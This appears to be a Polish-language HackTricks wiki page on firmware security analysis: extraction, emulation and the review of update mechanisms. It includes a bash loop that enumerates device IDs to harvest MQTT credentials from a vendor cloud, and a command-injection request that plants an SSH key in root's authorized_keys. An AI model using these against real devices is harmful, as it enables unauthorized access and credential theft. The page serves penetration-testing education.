# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware to podstawowe oprogramowanie, które pozwala urządzeniom działać prawidłowo, zarządzając i ułatwiając komunikację między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywane w pamięci stałej, co zapewnia urządzeniu dostęp do kluczowych instrukcji od momentu włączenia zasilania, prowadząc do uruchomienia systemu operacyjnego. Analiza i ewentualna modyfikacja firmware to istotny krok w identyfikowaniu luk bezpieczeństwa.

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy początkowy etap zrozumienia budowy urządzenia i technologii, których używa. Proces ten obejmuje gromadzenie danych o:

- Architektura CPU i system operacyjny, który na nim działa
- Szczegóły Bootloadera
- Układ sprzętowy i datasheety
- Metryki bazy kodu i lokalizacje źródeł
- Biblioteki zewnętrzne i typy licencji
- Historia aktualizacji i certyfikaty regulacyjne
- Diagramy architektury i przepływów
- Oceny bezpieczeństwa i wykryte podatności

Do tego celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów open-source przy użyciu przeglądów ręcznych i automatycznych. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują darmową analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Pozyskanie firmware można przeprowadzić różnymi metodami, z różnym poziomem skomplikowania:

- **Bezpośrednio** od źródła (deweloperzy, producenci)
- **Budując** je według dostarczonych instrukcji
- **Pobierając** ze stron wsparcia producenta
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Uzyskując dostęp bezpośrednio do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytywanie **aktualizacji** za pomocą technik man-in-the-middle
- **Wyodrębnianie** z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- Nasłuchiwanie żądań aktualizacji w komunikacji urządzenia
- Identyfikacja i wykorzystanie hardcoded update endpoints
- **Zrzucanie** z bootloadera lub przez sieć
- Wyjęcie i odczytanie układu pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

## Analiza firmware

Teraz, gdy **posiadasz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak je traktować. Różne narzędzia, których możesz użyć do tego celu:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli nie znajdziesz wiele przy użyciu tych narzędzi, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>` — jeśli entropia jest niska, obraz prawdopodobnie nie jest szyfrowany. Jeśli entropia jest wysoka, najprawdopodobniej jest zaszyfrowany (lub skompresowany w jakiś sposób).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych w firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Lub [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do analizy pliku.

### Uzyskiwanie systemu plików

Dzięki wcześniej wymienionym narzędziom, takim jak `binwalk -ev <bin>`, powinieneś być w stanie **wyodrębnić system plików**.\
Binwalk zwykle wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, który zazwyczaj jest jednym z: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma magicznego bajtu systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wydzielić (carve) skompresowany system plików** z binarki oraz **ręcznie wyodrębnić** system plików zgodnie z jego typem, stosując poniższe kroki.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następującą **dd command** w celu carvingu systemu plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można też uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (użytego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs na NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware

Po uzyskaniu firmware'u ważne jest jego rozebranie, aby zrozumieć strukturę i potencjalne podatności. Proces ten polega na użyciu różnych narzędzi do analizy i ekstrakcji wartościowych danych z obrazu firmware'u.

### Narzędzia do wstępnej analizy

Zestaw poleceń jest podany do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają w identyfikacji typów plików, wydobywaniu ciągów tekstowych, analizie danych binarnych oraz zrozumieniu partycji i szczegółów systemów plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, podczas gdy wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Używając `binwalk -ev <bin>`, zwykle można wyodrębnić system plików, często do katalogu nazwanego według typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnienie. Polega to na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), używa się różnych poleceń do ręcznego wyodrębnienia zawartości.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk bezpieczeństwa. Zwraca się uwagę na niezabezpieczone demony sieciowe, hardcoded credentials, API endpoints, funkcje serwera aktualizacji, niekompilowany kod, skrypty startowe oraz skompilowane binaria do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** dla danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych podatności
- Osadzone binaria do dalszej analizy
- Typowe serwery WWW urządzeń IoT i binaria

Kilka narzędzi pomaga w odkryciu wrażliwych informacji i podatności w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania wrażliwych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) oraz [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych binariów

Zarówno kod źródłowy, jak i skompilowane binaria znalezione w systemie plików muszą zostać dokładnie sprawdzone pod kątem podatności. Narzędzia takie jak **checksec.sh** dla binariów Unix i **PESecurity** dla binariów Windows pomagają zidentyfikować niezabezpieczone binaria, które mogłyby zostać wykorzystane.

## Pozyskiwanie konfiguracji chmurowej i poświadczeń MQTT za pomocą pochodnych tokenów URL

Wiele hubów IoT pobiera konfigurację per-urządzenie z endpointu chmurowego o wyglądzie:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Podczas analizy firmware możesz odkryć, że <token> jest generowany lokalnie z device ID przy użyciu hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Takie rozwiązanie pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać cloud config, często ujawniając poświadczenia MQTT w postaci tekstu jawnego i prefiksy tematów.

Praktyczny przebieg:

1) Wyodrębnij deviceId z logów bootowania UART

- Podłącz adapter UART 3.3V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Szukaj linii wypisujących wzorzec URL cloud config i adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Załaduj binaria do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wygeneruj token w Bash i zamień digest na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pozyskaj cloud config i poświadczenia MQTT

- Skomponuj URL i pobierz JSON za pomocą curl; sparsuj przy użyciu jq, aby wydobyć secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystaj plaintext MQTT i słabe topic ACLs (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować maintenance topics i wyszukać wrażliwe zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Wylicz przewidywalne device IDs (na dużą skalę, z autoryzacją)

- Wiele ekosystemów osadza bajty vendor OUI/product/type, po których następuje sufiks sekwencyjny.
- Możesz iterować candidate IDs, derive tokens i fetch configs programowo:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed próbą mass enumeration.
- W miarę możliwości preferuj emulation lub static analysis, aby odzyskać secrets bez modyfikowania target hardware.

Proces emulacji firmware umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od hardware lub architecture, jednak przeniesienie root filesystem lub konkretnych binaries na urządzenie o zgodnej architecture i endianness, takie jak Raspberry Pi, lub na wstępnie przygotowaną virtual machine, może ułatwić dalsze testy.

### Emulating Individual Binaries

Przy badaniu pojedynczych programów kluczowe jest określenie endianness oraz architektury CPU programu.

#### Example with MIPS Architecture

Aby emulować binarkę dla architektury MIPS, można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia do emulacji:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Dla MIPS (big-endian) używa się `qemu-mips`, a dla binarek little-endian wybór pada na `qemu-mipsel`.

#### Emulacja architektury ARM

Dla binarek ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Full System Emulation

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware'u, automatyzując proces i wspomagając analizę dynamiczną.

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się środowiska urządzenia rzeczywistego lub emulowanego. Kluczowe jest utrzymanie dostępu do shella systemu i systemu plików. Emulacja może nie odzwierciedlać w pełni interakcji ze sprzętem, co może wymagać okresowych restartów emulacji. Analiza powinna ponownie przeszukać system plików, exploitować ujawnione strony WWW i usługi sieciowe oraz zbadać luki w bootloaderze. Testy integralności firmware'u są istotne do wykrycia potencjalnych backdoorów.

## Techniki analizy w czasie wykonania

Analiza w czasie wykonania polega na interakcji z procesem lub binarką w jej środowisku wykonawczym, używając narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania podatności za pomocą fuzzingu i innych technik.

## Binary Exploitation and Proof-of-Concept

Tworzenie PoC dla wykrytych podatności wymaga dogłębnej znajomości docelowej architektury oraz programowania w językach niskiego poziomu. Ochrony runtime binarek w systemach embedded są rzadkie, ale jeśli występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

## Przygotowane systemy operacyjne do analizy firmware'u

Systemy takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) dostarczają wstępnie skonfigurowane środowiska do testów bezpieczeństwa firmware'u, wyposażone w niezbędne narzędzia.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS jest dystrybucją mającą pomóc w przeprowadzaniu security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko ze wszystkimi potrzebnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system oparty na Ubuntu 18.04 z preinstalowanymi narzędziami do testowania bezpieczeństwa firmware'u.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Nawet gdy dostawca wdroży sprawdzanie podpisu kryptograficznego dla obrazów firmware, często pomijana jest ochrona przed version rollback (downgrade). Jeśli boot- lub recovery-loader weryfikuje jedynie podpis za pomocą wbudowanego klucza publicznego, ale nie porównuje *wersji* (lub monotonicznego licznika) obrazu, który ma zostać wgrany, atakujący może legalnie zainstalować **starszy, podatny firmware, który wciąż ma ważny podpis**, i tym samym ponownie wprowadzić poprawione wcześniej podatności.

Typowy przebieg ataku:

1. **Uzyskać starszy podpisany obraz**
* Pobierz go z publicznego portalu dostawcy, CDN lub strony wsparcia.
* Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. wewnątrz Android APK pod `assets/firmware/`).
* Pobierz go z repozytoriów stron trzecich, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij lub udostępnij obraz urządzeniu** przez dowolny otwarty kanał aktualizacji:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Wiele urządzeń IoT konsumenckich udostępnia *unauthenticated* endpointy HTTP(S), które akceptują Base64-enkodowane bloby firmware'u, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade'u wykorzystaj podatność, która została załatana w nowszym wydaniu (np. filtr command-injection dodany później).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (downgraded) firmware parametr `md5` jest bezpośrednio konkatenowany do polecenia powłoki bez sanitizacji, co pozwala na command injection (tutaj — enabling SSH key-based root access). Późniejsze wersje firmware wprowadziły podstawowy filtr znaków, ale brak ochrony przed downgrade sprawia, że poprawka jest bezskuteczna.

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców pakuje pełne obrazy firmware w swoich aplikacjach mobilnych towarzyszących, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Te paczki są zwykle przechowywane nieszyfrowane w APK/APEX pod ścieżkami takimi jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` lub nawet zwykły `unzip` pozwalają na wyciągnięcie podpisanych obrazów bez dotykania fizycznego sprzętu.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista kontrolna do oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *update endpoint* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotonic anti-rollback counter** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach secure boot chain (np. podpisy sprawdzane przez kod ROM)?
* Czy userland code wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy *partial* lub *backup* ścieżki aktualizacji ponownie używają tej samej logiki walidacji?

> 💡  Jeśli któregokolwiek z powyższych brakuje, platforma prawdopodobnie jest podatna na rollback attacks.

## Podatne firmware do ćwiczeń

Aby ćwiczyć odkrywanie podatności w firmware, użyj poniższych projektów vulnerable firmware jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Źródła

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
